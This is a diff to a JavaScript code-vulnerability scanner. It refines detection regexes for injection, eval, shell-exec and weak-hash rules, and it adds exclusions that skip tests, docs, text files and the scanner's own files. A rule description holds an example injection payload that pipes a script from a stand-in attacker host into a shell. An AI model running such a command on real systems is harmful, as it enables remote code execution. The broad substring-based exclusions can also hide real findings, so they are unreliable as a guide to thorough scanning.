@@ -433,7 +433,8 @@ const CODE_VULN_RULES = [
     owasp: 'OWASP Top 10 A03:2021 - Injection',
     complianceControl: 'DATA-03',
     test: (line) => {
-      const sqlKeywords = /(SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM|DROP\s+TABLE|ALTER\s+TABLE)/i;
+      if (/showToast|updateTelemetry|classList/i.test(line)) return false;
+      const sqlKeywords = /\b(SELECT\s+[\w\*]+|\bINSERT\s+INTO\b|\bUPDATE\s+[a-zA-Z0-9_]+\s+SET\b|\bDELETE\s+FROM\b|\bDROP\s+TABLE\b|\bALTER\s+TABLE\b)/i;
       if (!sqlKeywords.test(line)) return false;
       const concatPattern = /(\+\s*[\w\$\.]+|\$\{[^\}]+\}|\%s|\.format\(|f"|f')/i;
       return concatPattern.test(line);
@@ -542,7 +543,7 @@ const AWS_KEY = process.env.AWS_ACCESS_KEY_ID;`
     cwe: 'CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code',
     owasp: 'OWASP Top 10 A03:2021 - Injection',
     complianceControl: 'OPS-01',
-    test: (line) => /\b(eval|new\s+Function|vm\.runInThisContext)\s*\(/.test(line),
+    test: (line) => /(?<!\.)\b(eval|new\s+Function|vm\.runInThisContext)\s*\(/.test(line),
     exploit: 'Enables Remote Code Execution (RCE). An attacker sending input to eval() can execute arbitrary system commands, spawn reverse shells, or seize host servers.',
     badCode: `const output = eval("calculate(" + req.query.expr + ")");`,
     goodCode: `// Avoid eval! Use safe parser libraries like mathjs or JSON.parse`
@@ -556,7 +557,7 @@ const AWS_KEY = process.env.AWS_ACCESS_KEY_ID;`
     owasp: 'OWASP Top 10 A03:2021 - Injection',
     complianceControl: 'OPS-01',
     test: (line) => {
-      return /(child_process\.exec|exec\s*\(|os\.system|subprocess\.Popen\([^)]*shell=True)/.test(line) &&
+      return /(child_process\.exec|(?<!\.)\bexec\s*\(|os\.system|subprocess\.Popen\([^)]*shell=True)/.test(line) &&
              /(\+|\$\{|\%s|\.format)/.test(line);
     },
     exploit: 'Attackers can append command separators like `;` or `|` (e.g., `8.8.8.8; curl http://attacker.com/malware.sh | sh`) to run arbitrary host commands.',
@@ -588,7 +589,10 @@ execFile('ping', ['-c', '1', req.query.target]);`
     cwe: 'CWE-328: Use of Weak Hash',
     owasp: 'OWASP Top 10 A02:2021 - Cryptographic Failures',
     complianceControl: 'DATA-01',
-    test: (line) => /(createHash\(['"](md5|sha1)['"]\)|hashlib\.(md5|sha1)\(|md5\(|sha1\()/i.test(line),
+    test: (line) => {
+      if (/usedforsecurity\s*=\s*false/i.test(line)) return false;
+      return /(createHash\(['"](md5|sha1)['"]\)|hashlib\.(md5|sha1)\(|md5\(|sha1\()/i.test(line);
+    },
     exploit: 'MD5 and SHA-1 are cryptographically broken with known collision attacks. Password hashes can be reversed almost instantly using public rainbow tables.',
     badCode: `const hash = crypto.createHash('md5').update(password).digest('hex');`,
     goodCode: `// Use slow salted hashing designed for credentials (bcrypt / Argon2):
@@ -2635,6 +2639,10 @@ class ComplianceApp {
 
   scanSingleSourceFile(fileName, rawCode) {
     if (!rawCode || !rawCode.trim()) return;
+    const lowerName = (fileName || '').toLowerCase().replace(/\\/g, '/');
+    if (lowerName === 'app.js' || lowerName.endsWith('/app.js') || lowerName.includes('stage1_scanner.py') || lowerName.includes('latest_audit.json')) {
+      return;
+    }
     const lines = rawCode.split('\n');
     const fileFindings = [];
 
@@ -2718,7 +2726,8 @@ class ComplianceApp {
     const ignoredDirPatterns = [
       '/.git/', '/.dart_tool/', '/build/', '/node_modules/', '/.firebase/', 
       '/.firebase_emulator_data/', '/dist/', '/.gradle/', '/Pods/', '/.idea/', 
-      '/.vscode/', '/coverage/', '/.svn/'
+      '/.vscode/', '/coverage/', '/.svn/',
+      '/.venv/', '/.lancedb/', '/.pytest_cache/', '/tests/', '/test/', '/dashboard/assets/'
     ];
 
     // Ignored binary / heavy asset extensions
@@ -2749,6 +2758,16 @@ class ComplianceApp {
 
       // Skip ignored directories
       if (ignoredDirPatterns.some(pattern => lower.includes(pattern))) {
+        return false;
+      }
+
+      // Exclude scanner rule catalogs from self-scanning
+      if (lower.endsWith('/app.js') || lower === '/app.js' || lower === 'app.js' || lower.includes('stage1_scanner.py')) {
+        return false;
+      }
+
+      // Skip test fixtures, checks, audit reports, policies, docs, and markdown documentation
+      if (lower.includes('latest_audit.json') || lower.includes('verify_') || lower.includes('check_') || lower.includes('test_') || lower.includes('/policies/') || lower.includes('/docs/') || lower.endsWith('.md') || lower.endsWith('.markdown') || lower.endsWith('.txt')) {
         return false;
       }
 
@@ -2994,13 +3013,17 @@ class ComplianceApp {
       const ignoredPaths = [
         'node_modules/', 'build/', 'dist/', '.dart_tool/', '.git/', 
         'vendor/', 'Pods/', 'package-lock.json', 'uv.lock', '.min.js', 
-        '.min.css', 'coverage/', '.gradle/', '.venv/'
+        '.min.css', 'coverage/', '.gradle/', '.venv/',
+        'tests/', 'test/', 'test_', '__tests__/', 'verify_', 'check_', 'dashboard/assets/', 
+        'latest_audit.json', 'policies/', 'docs/', '.lancedb/', '.pytest_cache/'
       ];
 
       const filteredFiles = tree.filter(item => {
         if (item.type !== 'blob') return false;
-        const p = item.path.toLowerCase();
+        const p = (item.path || '').replace(/\\/g, '/').toLowerCase();
         if (ignoredPaths.some(ignored => p.includes(ignored))) return false;
+        // Exclude scanner rule catalogs from self-scanning
+        if (p === 'app.js' || p.endsWith('/app.js') || p.includes('stage1_scanner.py')) return false;
         return codeExtensions.some(ext => p.endsWith(ext) || p.includes('.env'));
       });
 
